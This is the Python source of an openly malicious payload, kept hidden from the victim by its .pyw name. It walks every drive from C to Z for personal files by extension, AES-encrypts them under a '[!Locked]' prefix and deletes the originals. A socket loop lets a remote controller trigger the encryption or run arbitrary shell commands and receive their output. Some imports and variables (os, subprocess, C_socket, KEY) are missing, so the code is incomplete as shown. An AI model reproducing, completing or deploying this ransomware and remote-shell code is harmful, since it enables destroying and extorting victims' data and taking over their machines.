# Payload file - .pyw extension to hide terminal from victim.

from Crypto.Hash import SHA256
from Crypto.Cipher import AES
import random
import sys
import pkg_resources



sysFiles = [] # all of the files found on the machine.


# Encryts a file with a key

def encrypt(key, filename):
    chunksize = 64 * 1024
    outFile = os.path.join(os.path.dirname(filename), "[!Locked]" + os.path.basename(filename))
    filesize = str(os.path.getsize(filename)).zfill(16)
    # Initiialization vector.
    IV = ''

    for i in range(16):
        IV += chr(random.randint(0, 0xFF))

    encryption = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, "rb") as infile:
        with open(outFile, "wb") as outfile:
            outfile.write(filesize)
            outfile.write(IV)
            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break

                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - (len(chunk) % 16))
                outfile.write(encryption.encrypt(chunk))



# Scout the system, find all files.

# Replace getcwd with '/root' for linux machines, or traverse all drives for windows machines.

def discoverFiles():
    foundFiles = []
    for root,subfiles,files in os.walk(os.getcwd()):
        for names in files:
            foundFiles.append(os.path.join(root,names))

    return foundFiles

def brickSystem():
    #c_socket.send("ENTER KEY..")
    #key_response = C_socket.recv(1024)

    C_socket.send("Finding all files..")
    ALL_FILES = discoverFiles()

    for target_file in ALL_FILES:
        if os.path.basename(target_file).startswith("[!Locked]"):
            pass
        elif target_file == os.path.join(os.getcwd(), sys.argv[0]):
            pass
        else:
            C_socket.send("Encrypting "+str(target_file))
            encrypt(SHA256.new(KEY).digest(), str(target_file))
            os.remove(target_file)


extensions = [
        # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
        'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
        'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies

        'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx', # Microsoft office
        'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OpenOffice, Adobe, Latex, Markdown, etc
        'yml', 'yaml', 'json', 'xml', 'csv', # structured data
        'db', 'sql', 'dbf', 'mdb', 'iso', # databases and disc images

        'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies
        'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code
        'java', 'class', 'jar', # java source code
        'ps', 'bat', 'vb', # windows based scripts
        'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # linux/mac based scripts
        'go', 'py', 'pyc', 'bf', 'coffee', # other source code files

        'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
]


# Search functions for all drives
# Check if the file is a wanted extension
def Search_C_Drive():
    for dirpath, dirs, files in os.walk("C:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)


def Search_D_Drive():
    for dirpath, dirs, files in os.walk("D:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_E_Drive():
    for dirpath, dirs, files in os.walk("E:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_F_Drive():
    for dirpath, dirs, files in os.walk("F:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_G_Drive():
    for dirpath, dirs, files in os.walk("G:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_H_Drive():
    for dirpath, dirs, files in os.walk("H:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_I_Drive():
    for dirpath, dirs, files in os.walk("I:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_J_Drive():
    for dirpath, dirs, files in os.walk("J:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_K_Drive():
    for dirpath, dirs, files in os.walk("K:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_L_Drive():
    for dirpath, dirs, files in os.walk("L:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_M_Drive():
    for dirpath, dirs, files in os.walk("M:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_N_Drive():
    for dirpath, dirs, files in os.walk("N:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_O_Drive():
    for dirpath, dirs, files in os.walk("O:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_P_Drive():
    for dirpath, dirs, files in os.walk("P:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_Q_Drive():
    for dirpath, dirs, files in os.walk("Q:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_R_Drive():
    for dirpath, dirs, files in os.walk("R:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_S_Drive():
    for dirpath, dirs, files in os.walk("S:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_T_Drive():
    for dirpath, dirs, files in os.walk("T:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_U_Drive():
    for dirpath, dirs, files in os.walk("U:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_V_Drive():
    for dirpath, dirs, files in os.walk("V:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_W_Drive():
    for dirpath, dirs, files in os.walk("W:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_X_Drive():
    for dirpath, dirs, files in os.walk("X:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_Y_Drive():
    for dirpath, dirs, files in os.walk("Y:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_Z_Drive():
    for dirpath, dirs, files in os.walk("Z:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)




while (1):

    cmd = C_socket.recv(1024)

    if cmd == "quit":
        break

    if cmd == "brick":
        C_socket.send("Encrypt the current computer database? y to continue")
        response = C_socket.recv(1024)
        if response == "y":
            brickSystem()
        else:
            pass


    

    # Run shell commands.
    else:

        SHELL_EXECUTE = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                         stdin=subprocess.PIPE)
        stdout_v = SHELL_EXECUTE.stdout.read() + SHELL_EXECUTE.stderr.read()  # retreive command outputs
        C_socket.send(stdout_v)  # send back output

C_socket.close()  # Close connection.
